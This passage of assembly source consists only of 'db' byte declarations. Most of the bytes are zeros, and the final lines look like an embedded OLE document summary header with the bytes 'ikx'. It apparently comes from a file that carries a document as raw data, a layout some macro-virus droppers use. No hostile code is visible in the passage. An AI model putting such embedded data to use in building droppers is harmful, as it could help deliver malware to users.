    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 0feh, 0ffh, 000h, 000h
    db 005h, 000h, 002h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 001h, 000h, 000h, 000h
    db 002h, 0d5h, 0cdh, 0d5h, 09ch, 02eh, 01bh, 010h, 093h, 097h, 008h, 000h
    db 02bh, 02ch, 0f9h, 0aeh, 030h, 000h, 000h, 000h, 0e8h, 000h, 000h, 000h
    db 00ch, 000h, 000h, 000h, 001h, 000h, 000h, 000h, 068h, 000h, 000h, 000h
    db 00fh, 000h, 000h, 000h, 070h, 000h, 000h, 000h, 005h, 000h, 000h, 000h
    db 07ch, 000h, 000h, 000h, 006h, 000h, 000h, 000h, 084h, 000h, 000h, 000h
    db 011h, 000h, 000h, 000h, 08ch, 000h, 000h, 000h, 017h, 000h, 000h, 000h
    db 094h, 000h, 000h, 000h, 00bh, 000h, 000h, 000h, 09ch, 000h, 000h, 000h
    db 010h, 000h, 000h, 000h, 0a4h, 000h, 000h, 000h, 013h, 000h, 000h, 000h
    db 0ach, 000h, 000h, 000h, 016h, 000h, 000h, 000h, 0b4h, 000h, 000h, 000h
    db 00dh, 000h, 000h, 000h, 0bch, 000h, 000h, 000h, 00ch, 000h, 000h, 000h
    db 0c9h, 000h, 000h, 000h, 002h, 000h, 000h, 000h, 0e4h, 004h, 000h, 000h
    db 01eh, 000h, 000h, 000h, 004h, 000h, 000h, 000h, 069h, 06bh, 078h, 000h
    db 003h, 000h, 000h, 000h, 001h, 000h, 000h, 000h, 003h, 000h, 000h, 000h
